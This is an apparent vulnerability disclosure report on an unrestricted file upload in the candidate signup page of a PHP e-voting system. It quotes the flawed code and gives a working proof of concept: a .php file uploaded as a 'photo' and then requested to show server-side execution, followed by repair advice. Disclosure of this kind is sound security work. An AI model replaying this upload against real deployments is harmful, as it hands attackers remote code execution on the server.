# SourceCodester Secured E-Voting System 1.0 /candidate_signup.php candidate_photo= Unrestricted File Upload leads to Remote Code Execution

## NAME OF AFFECTED PRODUCT(S)

- Secured E-Voting System (St Paul Academy Alumni 2001 set e-voting portal)

## Vendor Homepage

- https://www.sourcecodester.com/php/18790/secured-e-voting-system.html

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- (submitter name pending user confirmation — will be filled from vuldb.txt account at submission time)

## Vulnerable File

- /candidate_signup.php

## VERSION(S)

- 1.0 (current public download, 2026-11)

## Software Link

- https://www.sourcecodester.com/download-code?nid=18790&title=Secured+E-Voting+System+using+PHP+and+MySQL+Source+Code

# PROBLEM TYPE

## Vulnerability Type

- Unrestricted File Upload → Remote Code Execution (CWE-434 / CWE-94)

## Root Cause

- `/candidate_signup.php` lines 50-57. The candidate photo is a classic `$_FILES` upload, but the extension is taken **from the client-supplied filename** with `pathinfo(...PATHINFO_EXTENSION)` and saved with **no whitelist at all**:

```php
// candidate_signup.php:50-57
$target_dir = "uploadImage/Profile/";
...
$file_ext = pathinfo($_FILES["candidate_photo"]["name"], PATHINFO_EXTENSION);   // ← client-controlled
$photo_name = "candidate_" . $user_id . "_" . time() . "." . $file_ext;
$target_file = $target_dir . $photo_name;

if (move_uploaded_file($_FILES["candidate_photo"]["tmp_name"], $target_file)) {  // ← .php lands in web root
```

- Contrast with `/profile.php` (logged-in profile page), which correctly whitelists `jpg|jpeg|png|webp` — the candidate signup endpoint simply never got the same treatment.

## Impact

- Any authenticated user (candidate **or voter** — see the missing role-check issue in report 03) can register a candidate with a `.php` "photo" and obtain remote code execution on the server. Combined with the unauthenticated upload in report 01, the application offers two independent upload-to-RCE paths.

# DESCRIPTION

- During the security review of "Secured E-Voting System", an unrestricted file upload was found in `/candidate_signup.php`. The `candidate_photo` filename extension is used verbatim for the stored file and there is no extension whitelist or content validation. A `.php` file is stored under the web-served `uploadImage/Candidate/` directory and executes on request, giving authenticated remote code execution.

# Vulnerability details and POC

## Vulnerability location:

- `candidate_photo` parameter (multipart POST), `/candidate_signup.php`

## Payload:

multipart file part with

```
Content-Disposition: form-data; name="candidate_photo"; filename="probe.php"
Content-Type: application/octet-stream

<?php echo "EVOTE-RCE2-PROOF-".(6*7); ?>
```

## Steps (all requests against the local deployment at http://127.0.0.1:8138):

1. `POST /candidate_signup` with a normal account form plus the crafted file part above (position, party, manifesto are the other required fields). Server responds with a success page; the candidate row is created with `status='pending'` and `uploadImage/Profile/candidate_<id>_<time>.php` has been written.
2. Stored filename is recovered from the DB (`candidates.photo`) — forensics only, the attacker does not need it since the name pattern is predictable (`candidate_<id>_<time>.php`).
3. Request the dropped file:

```
GET /uploadImage/Profile/candidate_35_1794192314.php HTTP/1.1
Host: 127.0.0.1:8138
```

```
HTTP/1.1 200 OK

EVOTE-RCE2-PROOF-42
```

`6*7` was computed **server-side by PHP** — arbitrary code execution confirmed.

Full request/response log: `poc/F02-candidate_signup-rce.txt`

## Screenshot: uploaded candidate .php executing in the browser (EVOTE-RCE2-PROOF-42)

![F2 uploaded candidate php executes](img/f02-rce-proof.jpeg)

# Suggested repair

1. **Whitelist extensions** exactly like `profile.php` does (`jpg|jpeg|png|webp`) and reject everything else.
2. **Validate content** with `getimagesize()` before `move_uploaded_file()`.
3. **Store uploads outside the web root** or disable PHP execution in `uploadImage/` (`.htaccess` `php_flag engine off`).
4. **Derive the extension server-side** and randomize filenames (already partly done) — never trust the client filename.

# Dedup note

- NVD: 0 CVEs for this product (aliases `Secured E-Voting`, `E-Voting System` checked 2026-11-09).
- VulDB: no entries for this product or for `candidate_signup`. Same-author "Online Voting System 1.0" entries cover a different product with non-overlapping files.
